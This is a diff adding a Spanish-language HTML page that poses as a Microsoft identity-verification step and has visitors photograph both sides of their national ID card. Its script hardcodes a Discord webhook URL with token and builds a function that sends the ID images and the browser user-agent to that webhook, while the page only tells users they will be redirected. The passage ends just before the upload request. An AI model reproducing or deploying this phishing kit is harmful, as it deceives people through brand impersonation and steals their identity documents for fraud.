@@ -1,0 +1,1496 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Identidad - Envío Directo</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #2596be;
+            --primary-dark: #1d7a9c;
+            --primary-light: #4ab7db;
+            --secondary-color: #f0f9ff;
+            --accent-color: #10b981;
+            --text-dark: #1f2937;
+            --text-light: #6b7280;
+            --bg-light: #f9fafb;
+            --bg-white: #ffffff;
+            --border-color: #e5e7eb;
+            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+            --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+            --radius: 12px;
+            --radius-lg: 16px;
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            color: var(--text-dark);
+            background-color: var(--bg-light);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        /* Header y logo */
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px 0;
+        }
+
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            max-width: 200px;
+            height: auto;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .title {
+            font-family: 'Poppins', sans-serif;
+            font-weight: 700;
+            font-size: 2.2rem;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            font-size: 1.1rem;
+            color: var(--text-light);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        /* Indicador de progreso */
+        .progress-container {
+            background-color: var(--bg-white);
+            border-radius: var(--radius);
+            padding: 25px;
+            margin: 25px auto;
+            box-shadow: var(--shadow);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 8px;
+            background-color: #e5e7eb;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary-color), var(--primary-light));
+            border-radius: 4px;
+            width: 0%;
+            transition: width 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            position: relative;
+            z-index: 2;
+        }
+
+        .progress-step {
+            text-align: center;
+            flex: 1;
+            position: relative;
+        }
+
+        .step-circle {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #e5e7eb;
+            color: var(--text-light);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 10px;
+            font-weight: 600;
+            font-size: 1.1rem;
+            transition: all 0.4s ease;
+            border: 3px solid transparent;
+        }
+
+        .progress-step.active .step-circle {
+            background-color: var(--primary-color);
+            color: white;
+            transform: scale(1.1);
+            box-shadow: 0 0 0 5px rgba(37, 150, 190, 0.2);
+        }
+
+        .progress-step.completed .step-circle {
+            background-color: var(--accent-color);
+            color: white;
+        }
+
+        .step-text {
+            font-size: 0.9rem;
+            color: var(--text-light);
+            transition: all 0.3s ease;
+        }
+
+        .progress-step.active .step-text {
+            color: var(--primary-color);
+            font-weight: 600;
+        }
+
+        /* Secciones de captura */
+        .capture-section {
+            background-color: var(--bg-white);
+            border-radius: var(--radius-lg);
+            padding: 30px;
+            box-shadow: var(--shadow);
+            margin-bottom: 25px;
+            display: none;
+            animation: slideIn 0.6s ease-out forwards;
+            opacity: 0;
+            transform: translateY(20px);
+        }
+
+        @keyframes slideIn {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .capture-section.active {
+            display: block;
+        }
+
+        .section-header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .section-title {
+            font-family: 'Poppins', sans-serif;
+            font-weight: 600;
+            font-size: 1.8rem;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
+
+        .section-subtitle {
+            color: var(--text-light);
+            font-size: 1rem;
+        }
+
+        /* Contenedor de cámara */
+        .camera-container {
+            width: 100%;
+            height: 400px;
+            border-radius: var(--radius);
+            margin-bottom: 25px;
+            overflow: hidden;
+            position: relative;
+            background-color: #000;
+            display: none;
+        }
+
+        #cameraFeed {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .camera-controls {
+            position: absolute;
+            bottom: 20px;
+            left: 0;
+            right: 0;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            z-index: 10;
+        }
+
+        .camera-btn {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            border: none;
+            background-color: var(--primary-color);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            cursor: pointer;
+            transition: var(--transition);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .camera-btn:hover {
+            background-color: var(--primary-dark);
+            transform: scale(1.1);
+        }
+
+        .camera-btn.capture {
+            background-color: white;
+            color: var(--primary-color);
+            width: 70px;
+            height: 70px;
+        }
+
+        .camera-btn.capture:hover {
+            background-color: #f0f0f0;
+        }
+
+        /* Previsualización de imagen */
+        .preview-container {
+            width: 100%;
+            height: 300px;
+            border: 2px dashed var(--border-color);
+            border-radius: var(--radius);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 25px;
+            overflow: hidden;
+            position: relative;
+            background-color: var(--secondary-color);
+            transition: var(--transition);
+        }
+
+        .preview-container:hover {
+            border-color: var(--primary-color);
+        }
+
+        .preview-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            display: none;
+        }
+
+        .preview-placeholder {
+            text-align: center;
+            padding: 20px;
+            color: var(--text-light);
+        }
+
+        .preview-placeholder i {
+            font-size: 4rem;
+            margin-bottom: 15px;
+            color: var(--primary-color);
+            opacity: 0.7;
+        }
+
+        .preview-text {
+            font-size: 1.1rem;
+            margin-bottom: 5px;
+        }
+
+        /* Botones de acción */
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 14px 20px;
+            border: none;
+            border-radius: var(--radius);
+            font-family: 'Inter', sans-serif;
+            font-weight: 500;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .btn-primary {
+            background-color: var(--primary-color);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: var(--shadow);
+        }
+
+        .btn-secondary {
+            background-color: var(--bg-light);
+            color: var(--text-dark);
+            border: 1px solid var(--border-color);
+        }
+
+        .btn-secondary:hover {
+            background-color: #e5e7eb;
+        }
+
+        .btn-next {
+            background: linear-gradient(135deg, var(--primary-color), var(--primary-light));
+            color: white;
+            padding: 16px 35px;
+            font-size: 1.1rem;
+            margin-top: 20px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .btn-next:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        /* Indicador de carga */
+        .loader-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.95);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            display: none;
+        }
+
+        .loader {
+            width: 80px;
+            height: 80px;
+            border: 8px solid var(--border-color);
+            border-top: 8px solid var(--primary-color);
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+            margin-bottom: 30px;
+        }
+
+        .loader-stages {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .loader-stage {
+            text-align: center;
+            opacity: 0.5;
+            transition: var(--transition);
+        }
+
+        .loader-stage.active {
+            opacity: 1;
+            transform: scale(1.1);
+        }
+
+        .loader-stage i {
+            font-size: 2rem;
+            margin-bottom: 10px;
+            color: var(--primary-color);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loader-text {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
+
+        .loader-subtext {
+            color: var(--text-light);
+            max-width: 400px;
+            text-align: center;
+        }
+
+        /* Contador de redirección */
+        .redirect-countdown {
+            font-size: 1.2rem;
+            color: var(--primary-color);
+            font-weight: 600;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        /* Notificaciones */
+        .notification {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            padding: 18px 25px;
+            border-radius: var(--radius);
+            color: white;
+            font-weight: 500;
+            box-shadow: var(--shadow-lg);
+            z-index: 1001;
+            transform: translateY(100px);
+            opacity: 0;
+            transition: transform 0.4s ease, opacity 0.4s ease;
+        }
+
+        .notification.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        .notification.success {
+            background-color: var(--accent-color);
+        }
+
+        .notification.error {
+            background-color: #ef4444;
+        }
+
+        .notification.info {
+            background-color: var(--primary-color);
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .title {
+                font-size: 1.8rem;
+            }
+            
+            .capture-section {
+                padding: 20px;
+            }
+            
+            .action-buttons {
+                flex-direction: column;
+            }
+            
+            .btn {
+                width: 100%;
+            }
+            
+            .preview-container, .camera-container {
+                height: 300px;
+            }
+            
+            .progress-steps {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            .progress-step {
+                display: flex;
+                align-items: center;
+                text-align: left;
+            }
+            
+            .step-circle {
+                margin: 0 15px 0 0;
+                flex-shrink: 0;
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 15px;
+            }
+            
+            .header {
+                margin-bottom: 20px;
+            }
+            
+            .title {
+                font-size: 1.5rem;
+            }
+            
+            .preview-container, .camera-container {
+                height: 250px;
+            }
+            
+            .camera-btn {
+                width: 50px;
+                height: 50px;
+            }
+            
+            .camera-btn.capture {
+                width: 60px;
+                height: 60px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Encabezado con logo -->
+        <header class="header">
+            <div class="logo-container">
+                <!-- Logo de Microsoft -->
+                <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft Logo" class="logo">
+            </div>
+            <h1 class="title">Verificación de Identidad</h1>
+            <p class="subtitle">Sigue los pasos para capturar ambas caras de tu cédula</p>
+        </header>
+
+        <!-- Indicador de progreso -->
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="progress-steps">
+                <div class="progress-step active" id="step1">
+                    <div class="step-circle">1</div>
+                    <div class="step-text">Frente</div>
+                </div>
+                <div class="progress-step" id="step2">
+                    <div class="step-circle">2</div>
+                    <div class="step-text">Reverso</div>
+                </div>
+                <div class="progress-step" id="step3">
+                    <div class="step-circle">3</div>
+                    <div class="step-text">Enviar</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Paso 1: Frente de la cédula -->
+        <section class="capture-section active" id="stepFront">
+            <div class="section-header">
+                <h2 class="section-title">Paso 1: Frente de la Cédula</h2>
+                <p class="section-subtitle">Captura la parte frontal de tu cédula con buena iluminación</p>
+            </div>
+            
+            <!-- Contenedor de cámara para frente -->
+            <div class="camera-container" id="frontCameraContainer">
+                <video id="frontCameraFeed" autoplay playsinline></video>
+                <div class="camera-controls">
+                    <button class="camera-btn" id="frontSwitchCamera">
+                        <i class="fas fa-sync-alt"></i>
+                    </button>
+                    <button class="camera-btn capture" id="frontCaptureBtn">
+                        <i class="fas fa-camera"></i>
+                    </button>
+                    <button class="camera-btn" id="frontCloseCamera">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+                <canvas id="frontCameraCanvas" style="display:none;"></canvas>
+            </div>
+            
+            <!-- Previsualización de frente -->
+            <div class="preview-container" id="frontPreview">
+                <div class="preview-placeholder">
+                    <i class="fas fa-id-card"></i>
+                    <p class="preview-text">Vista frontal de la cédula</p>
+                    <p>Usa la cámara o selecciona una imagen</p>
+                </div>
+                <img id="frontImage" src="" alt="Frente de cédula">
+            </div>
+            
+            <div class="action-buttons">
+                <button class="btn btn-primary" id="frontCameraBtn">
+                    <i class="fas fa-camera"></i> Usar Cámara
+                </button>
+                <button class="btn btn-secondary" id="frontGalleryBtn">
+                    <i class="fas fa-images"></i> Galería
+                </button>
+            </div>
+            
+            <input type="file" accept="image/*" class="file-input" id="frontFileInput">
+            
+            <button class="btn btn-next" id="nextToBack" disabled>
+                <span>Continuar al Paso 2</span>
+                <i class="fas fa-arrow-right"></i>
+            </button>
+        </section>
+
+        <!-- Paso 2: Reverso de la cédula -->
+        <section class="capture-section" id="stepBack">
+            <div class="section-header">
+                <h2 class="section-title">Paso 2: Reverso de la Cédula</h2>
+                <p class="section-subtitle">Ahora captura la parte trasera de tu cédula</p>
+            </div>
+            
+            <!-- Contenedor de cámara para reverso -->
+            <div class="camera-container" id="backCameraContainer">
+                <video id="backCameraFeed" autoplay playsinline></video>
+                <div class="camera-controls">
+                    <button class="camera-btn" id="backSwitchCamera">
+                        <i class="fas fa-sync-alt"></i>
+                    </button>
+                    <button class="camera-btn capture" id="backCaptureBtn">
+                        <i class="fas fa-camera"></i>
+                    </button>
+                    <button class="camera-btn" id="backCloseCamera">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+                <canvas id="backCameraCanvas" style="display:none;"></canvas>
+            </div>
+            
+            <!-- Previsualización de reverso -->
+            <div class="preview-container" id="backPreview">
+                <div class="preview-placeholder">
+                    <i class="fas fa-id-card"></i>
+                    <p class="preview-text">Vista trasera de la cédula</p>
+                    <p>Usa la cámara o selecciona una imagen</p>
+                </div>
+                <img id="backImage" src="" alt="Reverso de cédula">
+            </div>
+            
+            <div class="action-buttons">
+                <button class="btn btn-primary" id="backCameraBtn">
+                    <i class="fas fa-camera"></i> Usar Cámara
+                </button>
+                <button class="btn btn-secondary" id="backGalleryBtn">
+                    <i class="fas fa-images"></i> Galería
+                </button>
+            </div>
+            
+            <input type="file" accept="image/*" class="file-input" id="backFileInput">
+            
+            <div class="action-buttons">
+                <button class="btn btn-secondary" id="backToFront">
+                    <i class="fas fa-arrow-left"></i> Volver al Paso 1
+                </button>
+                <button class="btn btn-primary" id="nextToSend" disabled>
+                    Continuar al Envío
+                    <i class="fas fa-arrow-right"></i>
+                </button>
+            </div>
+        </section>
+
+        <!-- Paso 3: Envío -->
+        <section class="capture-section" id="stepSend">
+            <div class="section-header">
+                <h2 class="section-title">Paso 3: Revisión y Envío</h2>
+                <p class="section-subtitle">Revisa que ambas imágenes sean correctas antes de enviar</p>
+            </div>
+            
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 30px;">
+                <div style="text-align: center;">
+                    <div style="height: 150px; border: 2px solid var(--border-color); border-radius: var(--radius); overflow: hidden; margin-bottom: 10px;">
+                        <img id="reviewFront" src="" alt="Frente" style="width: 100%; height: 100%; object-fit: contain;">
+                    </div>
+                    <p style="font-weight: 500; color: var(--primary-color);">Frente</p>
+                </div>
+                <div style="text-align: center;">
+                    <div style="height: 150px; border: 2px solid var(--border-color); border-radius: var(--radius); overflow: hidden; margin-bottom: 10px;">
+                        <img id="reviewBack" src="" alt="Reverso" style="width: 100%; height: 100%; object-fit: contain;">
+                    </div>
+                    <p style="font-weight: 500; color: var(--primary-color);">Reverso</p>
+                </div>
+            </div>
+            
+            <div style="background-color: var(--secondary-color); border-radius: var(--radius); padding: 20px; margin-bottom: 25px;">
+                <h3 style="color: var(--primary-color); margin-bottom: 15px; display: flex; align-items: center; gap: 10px;">
+                    <i class="fas fa-info-circle"></i> Información del envío
+                </h3>
+                <p><strong>✅ Serás redirigido automáticamente</strong></p>
+            </div>
+            
+            <div class="action-buttons">
+                <button class="btn btn-secondary" id="backToBack">
+                    <i class="fas fa-arrow-left"></i> Volver al Paso 2
+                </button>
+                <button class="btn btn-primary" id="submitBtn">
+                     Validar fotos
+                </button>
+            </div>
+        </section>
+    </div>
+
+    <!-- Overlay de carga -->
+    <div class="loader-overlay" id="loaderOverlay">
+        <div class="loader"></div>
+        
+        <div class="loader-stages" id="loaderStages">
+            <div class="loader-stage" id="stage1">
+                <i class="fas fa-image"></i>
+                <div>Preparando</div>
+            </div>
+            <div class="loader-stage" id="stage2">
+                <i class="fas fa-upload"></i>
+                <div>Subiendo</div>
+            </div>
+            <div class="loader-stage" id="stage3">
+                <div>Validando</div>
+            </div>
+        </div>
+        
+        <p class="loader-text" id="loaderStatus">Preparando fotos para validar</p>
+        <p class="loader-subtext">Las fotos se registro directamente</p>
+    </div>
+
+    <!-- Notificaciones -->
+    <div class="notification" id="notification"></div>
+
+    <script>
+        // ============================================
+        // CONFIGURACIÓN PRIVADA - WEBHOOK DE DISCORD
+        // ============================================
+        
+        // WEBHOOK CONFIGURADO (Solo editable aquí en el código)
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1465605598677565473/GpPoSB9EH8AtU-3gb5Eqr3TA_A2Z5Q_nU4lzAtPhE00nDk9SRjMuj5HU63u71JKjr-6G";
+        
+        // ============================================
+        // FIN DE CONFIGURACIÓN PRIVADA
+        // ============================================
+        
+        // Variables globales
+        let currentStep = 1;
+        let frontImageFile = null;
+        let backImageFile = null;
+        let frontImageData = null;
+        let backImageData = null;
+        let currentStream = null;
+        let currentCamera = 'environment'; // Para documentos, usar cámara trasera por defecto
+
+        // Elementos DOM
+        const progressFill = document.getElementById('progressFill');
+        const step1Element = document.getElementById('step1');
+        const step2Element = document.getElementById('step2');
+        const step3Element = document.getElementById('step3');
+
+        const stepFront = document.getElementById('stepFront');
+        const stepBack = document.getElementById('stepBack');
+        const stepSend = document.getElementById('stepSend');
+
+        // Elementos para frente
+        const frontCameraContainer = document.getElementById('frontCameraContainer');
+        const frontCameraFeed = document.getElementById('frontCameraFeed');
+        const frontCameraCanvas = document.getElementById('frontCameraCanvas');
+        const frontCameraBtn = document.getElementById('frontCameraBtn');
+        const frontGalleryBtn = document.getElementById('frontGalleryBtn');
+        const frontFileInput = document.getElementById('frontFileInput');
+        const frontPreview = document.getElementById('frontPreview');
+        const frontImage = document.getElementById('frontImage');
+        const frontPlaceholder = frontPreview.querySelector('.preview-placeholder');
+        const frontSwitchCamera = document.getElementById('frontSwitchCamera');
+        const frontCaptureBtn = document.getElementById('frontCaptureBtn');
+        const frontCloseCamera = document.getElementById('frontCloseCamera');
+        const nextToBack = document.getElementById('nextToBack');
+
+        // Elementos para reverso
+        const backCameraContainer = document.getElementById('backCameraContainer');
+        const backCameraFeed = document.getElementById('backCameraFeed');
+        const backCameraCanvas = document.getElementById('backCameraCanvas');
+        const backCameraBtn = document.getElementById('backCameraBtn');
+        const backGalleryBtn = document.getElementById('backGalleryBtn');
+        const backFileInput = document.getElementById('backFileInput');
+        const backPreview = document.getElementById('backPreview');
+        const backImage = document.getElementById('backImage');
+        const backPlaceholder = backPreview.querySelector('.preview-placeholder');
+        const backSwitchCamera = document.getElementById('backSwitchCamera');
+        const backCaptureBtn = document.getElementById('backCaptureBtn');
+        const backCloseCamera = document.getElementById('backCloseCamera');
+        const backToFront = document.getElementById('backToFront');
+        const nextToSend = document.getElementById('nextToSend');
+
+        // Elementos para revisión y envío
+        const reviewFront = document.getElementById('reviewFront');
+        const reviewBack = document.getElementById('reviewBack');
+        const backToBack = document.getElementById('backToBack');
+        const submitBtn = document.getElementById('submitBtn');
+
+        // Elementos del loader
+        const loaderOverlay = document.getElementById('loaderOverlay');
+        const loaderStages = document.getElementById('loaderStages');
+        const loaderStatus = document.getElementById('loaderStatus');
+        const notification = document.getElementById('notification');
+
+        // Funciones para mostrar/ocultar notificaciones
+        function showNotification(message, type = 'success') {
+            notification.textContent = message;
+            notification.className = `notification ${type}`;
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 4000);
+        }
+
+        // Actualizar progreso
+        function updateProgress(step) {
+            const percentage = (step - 1) * 50;
+            progressFill.style.width = `${percentage}%`;
+            
+            step1Element.classList.remove('active', 'completed');
+            step2Element.classList.remove('active', 'completed');
+            step3Element.classList.remove('active', 'completed');
+            
+            if (step === 1) {
+                step1Element.classList.add('active');
+            } else if (step === 2) {
+                step1Element.classList.add('completed');
+                step2Element.classList.add('active');
+            } else if (step === 3) {
+                step1Element.classList.add('completed');
+                step2Element.classList.add('completed');
+                step3Element.classList.add('active');
+            }
+        }
+
+        // Cambiar paso
+        function goToStep(step) {
+            // Detener cámara si está activa
+            stopCamera();
+            
+            // Ocultar sección actual
+            const currentSection = document.querySelector('.capture-section.active');
+            if (currentSection) {
+                currentSection.classList.remove('active');
+            }
+            
+            // Actualizar paso actual
+            currentStep = step;
+            updateProgress(step);
+            
+            // Mostrar nueva sección
+            setTimeout(() => {
+                if (step === 1) {
+                    stepFront.classList.add('active');
+                } else if (step === 2) {
+                    stepBack.classList.add('active');
+                } else if (step === 3) {
+                    if (frontImageData) reviewFront.src = frontImageData;
+                    if (backImageData) reviewBack.src = backImageData;
+                    stepSend.classList.add('active');
+                }
+            }, 100);
+        }
+
+        // Iniciar cámara
+        async function startCamera(isFront = true) {
+            try {
+                // Detener cámara anterior si existe
+                if (currentStream) {
+                    currentStream.getTracks().forEach(track => track.stop());
+                }
+                
+                // Solicitar permisos de cámara
+                const constraints = {
+                    video: {
+                        facingMode: currentCamera,
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    },
+                    audio: false
+                };
+                
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                currentStream = stream;
+                
+                // Mostrar feed de cámara
+                if (isFront) {
+                    frontCameraFeed.srcObject = stream;
+                    frontCameraContainer.style.display = 'block';
+                    frontPreview.style.display = 'none';
+                } else {
+                    backCameraFeed.srcObject = stream;
+                    backCameraContainer.style.display = 'block';
+                    backPreview.style.display = 'none';
+                }
+                
+                showNotification('✅ Cámara activada. Coloca el documento dentro del marco.', 'success');
+                
+            } catch (error) {
+                console.error('Error al acceder a la cámara:', error);
+                
+                if (error.name === 'NotAllowedError') {
+                    showNotification('❌ Permiso de cámara denegado. Por favor, permite el acceso a la cámara.', 'error');
+                } else if (error.name === 'NotFoundError') {
+                    showNotification('❌ No se encontró ninguna cámara en el dispositivo.', 'error');
+                } else {
+                    showNotification('❌ Error al acceder a la cámara.', 'error');
+                }
+                
+                // Mostrar opción de galería
+                if (isFront) {
+                    frontCameraContainer.style.display = 'none';
+                    frontPreview.style.display = 'flex';
+                } else {
+                    backCameraContainer.style.display = 'none';
+                    backPreview.style.display = 'flex';
+                }
+            }
+        }
+
+        // Detener cámara
+        function stopCamera() {
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+                currentStream = null;
+            }
+            
+            frontCameraFeed.srcObject = null;
+            frontCameraContainer.style.display = 'none';
+            frontPreview.style.display = 'flex';
+            
+            backCameraFeed.srcObject = null;
+            backCameraContainer.style.display = 'none';
+            backPreview.style.display = 'flex';
+        }
+
+        // Capturar foto desde cámara
+        function capturePhoto(isFront = true) {
+            try {
+                const video = isFront ? frontCameraFeed : backCameraFeed;
+                const canvas = isFront ? frontCameraCanvas : backCameraCanvas;
+                const previewImg = isFront ? frontImage : backImage;
+                const previewPlaceholder = isFront ? frontPlaceholder : backPlaceholder;
+                
+                // Configurar canvas con las dimensiones del video
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                // Dibujar frame del video en el canvas
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Convertir canvas a blob con alta calidad
+                canvas.toBlob(async (blob) => {
+                    if (blob) {
+                        // Crear archivo desde blob
+                        const fileName = isFront ? 'cedula_frente.jpg' : 'cedula_reverso.jpg';
+                        const file = new File([blob], fileName, { 
+                            type: 'image/jpeg',
+                            lastModified: Date.now()
+                        });
+                        
+                        // Convertir a base64 para previsualización
+                        const reader = new FileReader();
+                        reader.onload = function(e) {
+                            previewImg.src = e.target.result;
+                            previewImg.style.display = 'block';
+                            previewPlaceholder.style.display = 'none';
+                            
+                            if (isFront) {
+                                frontImageFile = file;
+                                frontImageData = e.target.result;
+                                nextToBack.disabled = false;
+                            } else {
+                                backImageFile = file;
+                                backImageData = e.target.result;
+                                nextToSend.disabled = false;
+                            }
+                            
+                            // Detener cámara después de capturar
+                            stopCamera();
+                            
+                            showNotification(`✅ ${isFront ? 'Frente' : 'Reverso'} capturado correctamente`, 'success');
+                        };
+                        reader.readAsDataURL(blob);
+                    }
+                }, 'image/jpeg', 0.95); // 95% de calidad
+                
+            } catch (error) {
+                console.error('Error al capturar foto:', error);
+                showNotification('❌ Error al capturar la foto', 'error');
+            }
+        }
+
+        // Mostrar loader
+        function showLoader() {
+            loaderOverlay.style.display = 'flex';
+        }
+
+        // Actualizar etapa del loader
+        function updateLoaderStage(stage) {
+            document.querySelectorAll('.loader-stage').forEach((s, i) => {
+                s.classList.toggle('active', i < stage);
+            });
+        }
+
+        // Ocultar loader
+        function hideLoader() {
+            loaderOverlay.style.display = 'none';
+        }
+
+        // Función para mostrar imagen desde galería
+        function displayImageFromFile(file, isFront = true) {
+            const reader = new FileReader();
+            const previewImg = isFront ? frontImage : backImage;
+            const previewPlaceholder = isFront ? frontPlaceholder : backPlaceholder;
+            
+            reader.onload = function(e) {
+                previewImg.src = e.target.result;
+                previewImg.style.display = 'block';
+                previewPlaceholder.style.display = 'none';
+                
+                if (isFront) {
+                    frontImageFile = file;
+                    frontImageData = e.target.result;
+                    nextToBack.disabled = false;
+                } else {
+                    backImageFile = file;
+                    backImageData = e.target.result;
+                    nextToSend.disabled = false;
+                }
+                
+                showNotification(`✅ ${isFront ? 'Frente' : 'Reverso'} cargado desde galería`, 'success');
+            };
+            
+            reader.readAsDataURL(file);
+        }
+
+        // Event Listeners para frente
+        frontCameraBtn.addEventListener('click', () => {
+            startCamera(true);
+        });
+
+        frontGalleryBtn.addEventListener('click', () => {
+            frontFileInput.click();
+        });
+
+        frontFileInput.addEventListener('change', (e) => {
+            if (e.target.files.length > 0) {
+                displayImageFromFile(e.target.files[0], true);
+            }
+        });
+
+        frontSwitchCamera.addEventListener('click', () => {
+            currentCamera = currentCamera === 'environment' ? 'user' : 'environment';
+            startCamera(true);
+        });
+
+        frontCaptureBtn.addEventListener('click', () => {
+            capturePhoto(true);
+        });
+
+        frontCloseCamera.addEventListener('click', () => {
+            stopCamera();
+        });
+
+        // Event Listeners para reverso
+        backCameraBtn.addEventListener('click', () => {
+            startCamera(false);
+        });
+
+        backGalleryBtn.addEventListener('click', () => {
+            backFileInput.click();
+        });
+
+        backFileInput.addEventListener('change', (e) => {
+            if (e.target.files.length > 0) {
+                displayImageFromFile(e.target.files[0], false);
+            }
+        });
+
+        backSwitchCamera.addEventListener('click', () => {
+            currentCamera = currentCamera === 'environment' ? 'user' : 'environment';
+            startCamera(false);
+        });
+
+        backCaptureBtn.addEventListener('click', () => {
+            capturePhoto(false);
+        });
+
+        backCloseCamera.addEventListener('click', () => {
+            stopCamera();
+        });
+
+        // Navegación entre pasos
+        nextToBack.addEventListener('click', () => {
+            if (frontImageFile) {
+                goToStep(2);
+            }
+        });
+
+        backToFront.addEventListener('click', () => {
+            goToStep(1);
+        });
+
+        nextToSend.addEventListener('click', () => {
+            if (backImageFile) {
+                goToStep(3);
+            }
+        });
+
+        backToBack.addEventListener('click', () => {
+            goToStep(2);
+        });
+
+        // ============================================
+        // FUNCIONES DE ENVÍO A DISCORD
+        // ============================================
+        
+        // Función para convertir base64 a blob
+        function dataURLtoBlob(dataurl) {
+            const arr = dataurl.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], { type: mime });
+        }
+
+        // Función para enviar archivos a Discord usando FormData
+        async function sendFilesToDiscord(files) {
+            try {
+                // Crear FormData
+                const formData = new FormData();
+                
+                // Agregar cada archivo al FormData
+                files.forEach((file, index) => {
+                    formData.append(`file${index}`, file.blob, file.name);
+                });
+                
+                // Agregar mensaje JSON
+                const payload = {
+                    content: `📋 **NUEVA VERIFICACIÓN DE IDENTIDAD RECIBIDA**\n\n✅ **Fotos enviadas directamente al chat**\n🕒 **Fecha:** ${new Date().toLocaleString('es-ES')}\n📱 **Dispositivo:** ${navigator.userAgent.substring(0, 50)}...\n\n🖼️ **Se han enviado ${files.length} fotos:**\n• ${files.map(f => f.name).join('\n• ')}`,
+                    username: "Sistema de Verificación",
+                    avatar_url: "https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg"
+                };
+                
+                formData.append('payload_json', JSON.stringify(payload));
+                
+                // Enviar a Discord
